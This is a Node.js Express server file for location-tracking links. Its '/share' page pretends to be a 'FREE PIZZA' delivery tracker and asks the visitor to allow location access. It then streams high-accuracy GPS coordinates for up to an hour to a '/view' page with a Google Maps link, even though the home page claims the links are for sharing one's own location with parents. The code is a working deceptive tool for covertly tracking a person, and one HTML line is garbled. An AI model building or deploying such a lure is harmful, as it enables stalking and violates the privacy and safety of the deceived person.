const express = require("express");
const cors = require("cors");
const crypto = require("crypto");

const app = express();
app.use(express.json());
app.use(cors());

const sessions = {}; // { id: { lat, lng, updatedAt } }

// Home page: creates links
app.get("/", (req, res) => {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8" />
    <title>Create Tracking Session</title>
  </head>
  <body>
    <h1>Create Tracking Session</h1>
    <button id="createBtn">Create New Link</button>

    <h2>Result</h2>
    <p><strong>Share Link (for YOU on your phone):</strong></p>
    <p id="shareLink">--</p>

    <p><strong>View Link (send to your parents):</strong></p>
    <p id="viewLink">--</p>

    <script>
      const btn = document.getElementById("createBtn");
      const shareEl = document.getElementById("shareLink");
      const viewEl = document.getElementById("viewLink");

      btn.addEventListener("click", async () => {
        shareEl.textContent = "Creating...";
        viewEl.textContent = "";

        try {
          const res = await fetch("/create-link", { method: "POST" });
          const data = await res.json();

          shareEl.innerHTML = '<a href="' + data.shareUrl + '" target="_blank">' + data.shareUrl + '</a>';
          viewEl.innerHTML = '<a href="' + data.viewUrl + '" target="_blank">' + data.viewUrl + '</a>';
        } catch (e) {
          shareEl.textContent = "Error creating link.";
          console.error(e);
        }
      });
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

// Page that shares YOUR location
app.get("/share", (req, res) => {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8" />
    <    <title>FREE PIZZA LOADING!</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      }

      body {
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background: radial-gradient(circle at top, #ffecd2 0, #fcb69f 25%, #f57c4a 60%, #8b1e1e 100%);
        color: #fff;
      }

      .card {
        background: rgba(0, 0, 0, 0.75);
        border-radius: 18px;
        padding: 24px 28px;
        max-width: 420px;
        width: 90%;
        box-shadow: 0 18px 40px rgba(0, 0, 0, 0.35);
        text-align: center;
        border: 1px solid rgba(255, 255, 255, 0.12);
      }

      .badge {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 4px 10px;
        border-radius: 999px;
        background: rgba(255, 255, 255, 0.08);
        font-size: 12px;
        text-transform: uppercase;
        letter-spacing: 0.08em;
        margin-bottom: 10px;
      }

      .badge-dot {
        width: 8px;
        height: 8px;
        border-radius: 999px;
        background: #18ff6d;
        box-shadow: 0 0 8px #18ff6d;
      }

      h1 {
        font-size: 26px;
        margin-bottom: 8px;
      }

      .subtitle {
        font-size: 13px;
        opacity: 0.85;
        margin-bottom: 18px;
      }

      .pizza-emoji {
        font-size: 46px;
        margin: 6px 0 14px;
      }

      #status {
        background: rgba(255, 255, 255, 0.06);
        border-radius: 10px;
        padding: 10px 12px;
        font-size: 14px;
        line-height: 1.4;
        margin-bottom: 10px;
      }

      .hint {
        font-size: 11px;
        opacity: 0.9;
        margin-top: 4px;
      }

      .timer {
        font-size: 12px;
        margin-top: 10px;
        opacity: 0.9;
      }

      .coords {
        font-size: 11px;
        opacity: 0.85;
        margin-top: 6px;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <div class="badge">
        <span class="badge-dot"></span>
        LIVE PIZZA TRACKING
      </div>
      <div class="pizza-emoji">🍕</div>
      <h1>Your FREE Pizza Is On Its Way</h1>
      <p class="subtitle">
        Stay on this page so the kitchen can follow your location
        and "deliver" the pizza. (Demo tracking)
      </p>

      <p id="status">Requesting location permission...</p>
      <p class="hint">Tip: Tap “Allow” when the browser asks for your location.</p>
      <p class="timer">Tracking active for up to 1 hour.</p>
      <p class="coords" id="coordsHint"></p>
    </div>

    <script>
      const params = new URLSearchParams(window.location.search);
      const id = params.get("id");
      const statusEl = document.getElementById("status");

      const stopTime = Date.now() + 60 * 60 * 1000; // 1 hour

      if (!id) {
        statusEl.innerText = "Missing id in URL.";
      } else if (!navigator.geolocation) {
        statusEl.innerText = "Geolocation not supported on this device.";
      } else {
        navigator.geolocation.watchPosition(
          async (pos) => {
            if (Date.now() > stopTime) {
              statusEl.innerText = "Sharing stopped (1 hour over). You can close this tab.";
              return;
            }

            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            statusEl.innerText = "Please stay patient, your pizza is being located...";

            try {
              await fetch("/update-location/" + id, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ lat, lng }),
              });
            } catch (e) {
              console.error("Error sending location:", e);
            }
          },
          (err) => {
            statusEl.innerText = "Error getting location: " + err.message;
          },
          {
            enableHighAccuracy: true,
            maximumAge: 5000,
            timeout: 20000,
          }
        );
      }
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

// Page for your parents to view
app.get("/view", (req, res) => {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8" />
    <title>Track Location</title>
  </head>
  <body>
    <h2>Current Location</h2>
    <p id="info">Waiting for location...</p>
    <p><a id="mapsLink" href="#" target="_blank">Open in Google Maps</a></p>

    <script>
      const params = new URLSearchParams(window.location.search);
      const id = params.get("id");
      const info = document.getElementById("info");
      const link = document.getElementById("mapsLink");

      if (!id) {
        info.innerText = "Missing id in URL.";
      } else {
        async function fetchLocation() {
          try {
            const res = await fetch("/location/" + id);
            if (!res.ok) {
              info.innerText = "No location yet or session not found.";
              return;
            }

            const data = await res.json();
            if (!data.lat || !data.lng) {
              info.innerText = "Location not received yet.";
              return;
            }

            info.innerText = "Lat: " + Number(data.lat).toFixed(5) + ", Lng: " + Number(data.lng).toFixed(5);
            const mapsUrl = "https://www.google.com/maps?q=" + data.lat + "," + data.lng;
            link.href = mapsUrl;
          } catch (e) {
            info.innerText = "Error fetching location.";
            console.error(e);
          }
        }

        setInterval(fetchLocation, 15000);
        fetchLocation();
      }
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

// API: create-link
app.post("/create-link", (req, res) => {
  const id = crypto.randomBytes(8).toString("hex");
  sessions[id] = { lat: null, lng: null, updatedAt: null };

  const baseUrl = req.protocol + "://" + req.get("host");
  const shareUrl = baseUrl + "/share?id=" + id;
  const viewUrl = baseUrl + "/view?id=" + id;

  res.json({ id, shareUrl, viewUrl });
});

// API: update-location
app.post("/update-location/:id", (req, res) => {
  const id = req.params.id;
  const { lat, lng } = req.body;

  if (!sessions[id]) {
    return res.status(404).json({ error: "Session not found" });
  }

  sessions[id] = {
    lat,
    lng,
    updatedAt: Date.now(),
  };

  res.json({ ok: true });
});

// API: get latest location
app.get("/location/:id", (req, res) => {
  const id = req.params.id;
  const session = sessions[id];

  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }

  res.json(session);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running at http://localhost:" + PORT);
});

